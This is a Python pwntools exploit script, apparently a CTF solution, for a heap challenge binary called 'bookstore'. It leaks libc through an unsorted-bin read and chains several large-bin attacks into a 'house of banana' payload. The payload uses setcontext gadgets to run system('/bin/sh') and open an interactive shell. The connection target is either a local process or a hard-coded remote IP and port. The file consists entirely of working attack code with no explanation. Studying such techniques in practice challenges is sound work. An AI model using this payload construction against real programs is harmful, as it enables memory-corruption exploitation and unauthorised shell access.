#!/usr/bin/env python3
#coding=utf-8
from pwn import*
from LibcSearcher import *
context.log_level = 'debug'
context.arch='amd64'
binary = './bookstore' 
main_arena = 0x1ebb80
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
su = lambda buf,addr:io.success(buf+"==>"+hex(addr))
local = 1
if local == 1:
    io=process(binary)
else:
    io=remote('49.233.13.133',53200)
elf=ELF(binary)
libc = elf.libc
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc-2.31.so")
def add(size,content='a',content1='a'):
	ru("choice:")
	sl('1')
	ru("Size:")
	sl(str(size))
	ru("Content:")
	sl(content)
	ru('Remark:')
	sl(content1)

def add1(size):
	ru("choice:")
	sl('1')
	ru("Size:")
	sl(str(size))


def edit(index,content,content1):
	ru("choice:")
	sl('3')
	ru('Index:')
	sl(str(index))
	ru("Content:")
	s(content)
	ru('Remark:')
	s(content1)
	
def show(index):
	ru("choice:")
	sl('4')
	ru("Index:")
	sl(str(index))	
	
def free(index):
	ru("choice:")
	sl('2')
	ru("Index:")
	sl(str(index))
add(0x517)#0

add(0x500)#1


free(0)

show(0)
leak = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x1BEBE0#- 96 -main_arena
#libc = LibcSearcher('__malloc_hook', leak)
libc_base = leak #libc.sym['__malloc_hook']
fh = libc.sym['__free_hook'] + libc_base
mh = libc.sym['__malloc_hook'] + libc_base
system = libc.sym['system'] + libc_base
chain = libc.sym['_IO_2_1_stderr_'] + libc_base + 96+8
su('libc_base',libc_base)

#add1(0x510)

#free(0)
add1(0x600)

free(1)
rtl_global = libc_base +0x20d060#2175072#0x240060

edit(0,p64(0)*3+p64(rtl_global-0x20),b'a')
gdb.attach(io)
add1(0x600)#large bin attack!!

show(0)

ru("Content: \n")
chunk = u64(r(6).ljust(8,b'\x00'))
success(hex(chunk))


#large bin attack!!
add1(0x500)
#free(0)
edit(0,p64(0)*3+p64(chunk-0x20),b'a')
free(1)

add1(0x600)#large bin attack!!

#large bin attack!!
add1(0x500)
#free(0)
edit(0,p64(0)*3+p64(rtl_global-0x20),b'a')
free(1)

add1(0x600)#large bin attack!!


#house of banana
#rtl_global = libc_base +0x213060 #libc.sym['rtld_global']
set_context = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 127#next(libc.search(asm('ret')))#libc.sym['setcontext'] + 300
pop_rdi = libc_base + next(libc.search(asm('pop rdx\nret')))
binsh_addr = libc_base + next(libc.search(b'/bin/sh\0'))
system_addr =  libc_base + libc.sym['system']

payload = p64(0) + p64(rtl_global+0x16e0) + p64(0) + p64(chunk)#chunk
payload += p64(set_context) + p64(ret)


payload += b'\x00'*0x60
payload += p64(binsh_addr)
payload += p64(0)
#payload += p64(system_addr)
payload += b'\x00'*0x30

#payload += p64(chunk + 0x960 + 0x28 + 0x18)

payload += p64(system_addr)
payload = payload.ljust(0x100,b'\x00')
payload += p64(chunk+0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x31C - 0x10,b'\x00')
payload += p8(0x8) + b'\x00'*4

edit(1,payload,b'a')
pay = b'a'*0x510+p64(chunk+0x20)
edit(0,b'a',pay[:-1])
ru("choice:")
sl('5')
shell()
